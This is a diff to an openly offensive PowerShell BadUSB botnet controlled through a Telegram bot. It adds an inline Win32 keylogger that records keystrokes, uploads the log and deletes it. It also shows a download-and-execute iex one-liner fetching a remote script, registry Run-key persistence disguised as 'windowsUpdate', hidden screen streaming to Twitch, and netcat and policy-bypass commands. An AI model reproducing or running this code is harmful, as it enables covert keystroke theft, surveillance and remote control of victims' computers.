@@ -9,7 +9,7 @@ BADUSB COMMANDS:
     PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
 REGEDIT:
 	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"	
-https://www.akadia.com/services/windows_registry.html 
+    https://www.akadia.com/services/windows_registry.html 
 BOT TELEGRAM:
     https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
 	#>
@@ -164,22 +164,81 @@ function download($FileToDownload) {
     #curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
 }
 
-function keylogger($time) {
-    Write-Host "Downloading keylogger.."
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')
-    $log = "C:\Users\$env:username\Documents\key.txt"
-    Start-Sleep -Seconds 2
+function keylogger($seconds) {
+  # Requires -Version 2
+  # Signatures for API Calls
+  $signatures = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
 
-    Write-Host "Launching keylogger $time.."
-    Get-Keystrokes -LogPath $log -Timeout $time
+  $Path = "$env:temp\keylogger.txt"
+
+  # load signatures and make members available
+  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
     
-    Write-Host "Sending keystrokes.."
-    Start-Sleep -Seconds $time
-    download $log
+  # create output file
+  $null = New-Item -Path $Path -ItemType File -Force
 
-    Write-Host "Deleting log.."
+  try {
+    Write-Host 'Recording key presses..' -ForegroundColor Red
+
+    # create endless loop. When user presses CTRL+C, finally-block
+    # executes and shows the collected key presses
+    $timeout = new-timespan -Seconds  $time
+    $sw = [diagnostics.stopwatch]::StartNew()
+    while ($sw.elapsed -lt $timeout) {
+      Start-Sleep -Milliseconds 40
+      
+      # scan all ASCII codes above 8
+      for ($ascii = 9; $ascii -le 254; $ascii++) {
+        # get current key state
+        $state = $API::GetAsyncKeyState($ascii)
+
+        # is key pressed?
+        if ($state -eq -32767) {
+          $null = [console]::CapsLock
+
+          # translate scan code to real code
+          $virtualKey = $API::MapVirtualKey($ascii, 3)
+
+          # get keyboard state for virtual keys
+          $kbstate = New-Object Byte[] 256
+          $checkkbstate = $API::GetKeyboardState($kbstate)
+
+          # prepare a StringBuilder to receive input key
+          $mychar = New-Object -TypeName System.Text.StringBuilder
+
+          # translate virtual key
+          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+
+
+          if ($success) {
+            # add key to logger file
+            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+          }
+        }
+      }
+    }
+  }
+
+  finally {
+    # open logger file in Notepad - Only for test
+    #notepad $Path
+
+    Write-Host "Downloading keylogger file.."
+    download $Path
+
+    Write-Host "Deleting keylogger file.."
     Start-Sleep -Seconds 5
-    Remove-Item $log
+    Remove-Item $Path
+  }
 }
 
 function webcam {
@@ -468,7 +527,7 @@ function twitch($STREAM_KEY) {
     Start-Sleep -Seconds 5
     Expand-Archive $outpath -DestinationPath $outpathUnzip
     $FFmpeg = $outpathUnzip+"\ffmpeg-20180828-26dc763-win32-static\bin\ffmpeg.exe"
-    Start-Process -Filepath $FFmpeg "-f gdigrab -s 1920x1080 -framerate 15 -i desktop -c:v libx264 -preset fast -pix_fmt yuv420p -s 1280x800 -threads 0 -f flv rtmp://live-mad.twitch.tv/app/live_166678091_KFMc6ih9pgfBESfK4QN74iLpz7c6a8" -windowstyle hidden
+    Start-Process -Filepath $FFmpeg "-f gdigrab -s 1920x1080 -framerate 15 -i desktop -c:v libx264 -preset fast -pix_fmt yuv420p -s 1280x800 -threads 0 -f flv rtmp://live-mad.twitch.tv/app/$STREAM_KEY" -windowstyle hidden
 }
 
 function stoptwitch {
@@ -478,6 +537,7 @@ function stoptwitch {
     Remove-Item -Recurse "C:\Users\$env:username\Documents\FFmpeg"
     Remove-Item "C:\Users\$env:username\Documents\FFmpeg.zip"
 }
+
 
 #####################
 ## BYPASS POLICIES ##
@@ -630,7 +690,7 @@ While ($DoNotExit)  {
       }
       "/keylogger $ipV4 *"{
         $time = ($LastMessageText -split ("/keylogger $ipV4 "))[1]
-        Keylogger $time
+        keylogger seconds $time
       }
       "/nc $ipV4"{
         netcat
